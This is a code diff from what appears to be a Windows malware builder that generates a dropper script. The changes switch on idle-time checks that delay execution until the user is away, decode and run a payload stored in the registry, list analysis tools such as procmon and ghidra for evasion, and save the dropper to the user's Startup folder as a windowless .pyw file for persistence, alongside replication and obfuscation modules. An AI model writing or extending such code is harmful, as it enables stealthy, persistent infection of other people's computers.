@@ -4,12 +4,10 @@ import shutil
 import string
 import subprocess
 import time
-import zlib
-from zlib import compress
 from random import randrange,choice
 from Utils.helpers import is_os_64bit, random_string, run_pwsh, is_msvc_exist, \
     download_file, extract_zip, get_current_file_path, base64_encode_file, \
-    a85_encode_file,base85_encode_file,find_python_path, ctypes_update_system,\
+    find_python_path, ctypes_update_system,\
     is_admin,startupFolder,tempFolder,BaseTempFolder,set_env_variable,setRegistryKey,TypicalRegistryKey
 from Replication.main import replicate
 from .pyinstaller_obfuscate.obfuscationModule.main import Obfuscate
@@ -108,8 +106,8 @@ def get_idle_duration() -> float:
     millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
     return millis / 1000.0
 
-#while get_idle_duration() < 180:
-        #time.sleep(60)
+while get_idle_duration() < 180:
+        time.sleep(60)
 reg_path = f"{TypicalRegistryKey}"
 reg_key = f"{our_reg_key}"
 debug_process = ['procexp', 'procmon' 'autoruns', 'processhacker', 'ida', 'ghidra']
@@ -124,8 +122,8 @@ try:
                                        winreg.KEY_READ)
     value, regtype = winreg.QueryValueEx(registry_key, reg_key)
     winreg.CloseKey(registry_key)
-    #while get_idle_duration() < 180:
-        #time.sleep(60)
+    while get_idle_duration() < 180:
+        time.sleep(60)
     with open('{random_location}','wb') as file:
         if {type_of_manip} == '{is_rev_flag}':
             file.write({obfuscated_encoding_name}(value[::-1]))
@@ -136,8 +134,8 @@ try:
 except WindowsError:
     pass
 
-#while get_idle_duration() < 180:
-        #time.sleep(60)
+while get_idle_duration() < 180:
+        time.sleep(60)
 os.system('{random_location}')
 """
     else:
@@ -148,9 +146,23 @@ os.system('{random_location}')
 from base64 import {type_of_encoding} as {obfuscated_encoding_name}
 import time
 from os import system
+from ctypes import Structure, windll, c_uint, sizeof, byref,WinDLL
 
-#while get_idle_duration() < 180:
-        #time.sleep(60)
+class LASTINPUTINFO(Structure):
+    _fields_ = [
+        ('cbSize', c_uint),
+        ('dwTime', c_uint),
+    ]
+
+def get_idle_duration() -> float:
+    lastInputInfo = LASTINPUTINFO()
+    lastInputInfo.cbSize = sizeof(lastInputInfo)
+    windll.user32.GetLastInputInfo(byref(lastInputInfo))
+    millis = windll.kernel32.GetTickCount() - lastInputInfo.dwTime
+    return millis / 1000.0
+
+while get_idle_duration() < 180:
+        time.sleep(60)
 
 {type_of_manip} = '{hint}'
 our_code = {our_encoded_file}
@@ -166,11 +178,11 @@ def {obfuscated_main_function}():
     with open({backup_of_file},'wb') as {obfuscated_file_var}:
         {obfuscated_file_var}.write({obfuscated_encoding_name}(our_code))
     system({backup_of_file})
-#while get_idle_duration() < 180:
-        #time.sleep(60)
+while get_idle_duration() < 180:
+        time.sleep(60)
 {obfuscated_main_function}()
     """
-    dropper_py_file = startupFolder.format(os.getlogin(),random_string(is_random=True,is_py=True))
+    dropper_py_file = startupFolder.format(os.getlogin(),random_string(is_random=True,is_py=True) + 'w')
     with open(dropper_py_file, 'w') as dropper_file:
         dropper_file.write(code)
     print(dropper_py_file)
